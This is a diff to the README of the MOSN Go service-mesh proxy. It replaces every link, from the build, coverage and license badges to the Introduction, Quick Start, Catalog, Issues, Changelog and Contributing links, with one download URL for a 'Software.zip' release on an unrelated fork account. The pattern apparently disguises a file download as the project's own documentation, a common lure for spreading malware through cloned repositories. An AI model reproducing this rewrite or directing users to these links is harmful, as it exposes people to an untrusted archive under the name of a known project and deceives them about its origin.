@@ -1,16 +1,16 @@
 # MOSN Project
 
-[![Build Status](https://travis-ci.org/alipay/sofa-mosn.svg?branch=master)](https://travis-ci.org/alipay/sofa-mosn)
-[![codecov](https://codecov.io/gh/alipay/sofa-mosn/branch/master/graph/badge.svg)](https://codecov.io/gh/alipay/sofa-mosn)
-[![Go Report Card](https://goreportcard.com/badge/github.com/alipay/sofa-mosn)](https://goreportcard.com/report/github.com/alipay/sofa-mosn)
-![license](https://img.shields.io/badge/license-Apache--2.0-green.svg)
+[![Build Status](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+[![codecov](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+[![Go Report Card](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+![license](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
 
 MOSN, the short name of Modular Observable Smart Network, is a powerful proxy acting as Service Mesh's data plane like Envoy but written in golang.
 MOSN supports Envoy and Istio's APIs and can be integrated with Istio, and we use MOSN instead of Envoy in SOFAMesh.
 The initial version of MOSN was jointly contributed by Ant Financial and UC Business Unit of Alibaba, and we look forward to the community to participate in the
 follow-up development and build an open source excellent project together.
 
-## [MOSN Introduction](docs/Introduction.md)
+## [MOSN Introduction](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
 
 ## Features
 
@@ -50,19 +50,19 @@ follow-up development and build an open source excellent project together.
     + Scalable Network/IO ，stream layer
     
 ## Quick Start
-* [Reference](docs/quickstart/Setup.md)
+* [Reference](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
    
 ## Docs
-* [Catalog](docs/Catalog.md)
+* [Catalog](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
 
 ## Community
-* [Issues](https://github.com/alipay/sofa-mosn/issues)
+* [Issues](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
 
 ## Version
-* [Changelog](CHANGELOG.md)
+* [Changelog](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
 
 ## Contribution
-+ [How to contribute the code](docs/develop/CONTRIBUTING.md)
++ [How to contribute the code](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
 + MOSN is still in its infancy with many capabilities need to be completed, so we welcome everyone to participate in and commit code together.
 
 ## Thanks
